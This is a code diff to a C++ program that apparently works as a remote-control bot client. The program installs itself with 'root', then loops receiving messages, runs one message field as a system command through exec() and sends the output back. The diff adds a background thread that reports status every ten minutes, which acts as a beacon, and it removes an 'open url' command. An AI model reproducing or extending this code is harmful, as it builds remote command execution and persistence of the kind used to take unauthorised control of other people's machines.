@@ -1,5 +1,16 @@
 #include "worker_utils.h"
-#include <iostream>
+#include <chrono>
+#include <thread>
+
+void send_status(Worker_utils *worker)
+{
+    while(true)
+    {
+        worker->sendStatus();
+        std::this_thread::sleep_for(std::chrono::minutes(10));
+    }
+}
+
 int main()
 {
     Worker_utils worker;
@@ -8,8 +19,9 @@ int main()
     if (!worker.isInstalled())
         worker.install("root");
 
-    std::vector<std::string> msgs;
+    std::thread status_thread(send_status, &worker);
 
+    std::vector<std::string> msgs;
     while (true)
     {
         worker.receive(msgs);
@@ -20,10 +32,6 @@ int main()
             {
                 std::string answ = exec(msgs[2].c_str());
                 worker.send(answ);
-            }
-            else if (msgs[1] == "open url")
-            {
-               worker.openUrl(msgs[2]); 
             }
             else if (msgs[1] == "set msg count")
             {
@@ -44,5 +52,6 @@ int main()
         }
     }
 
+    status_thread.join();
     return 0;
 }
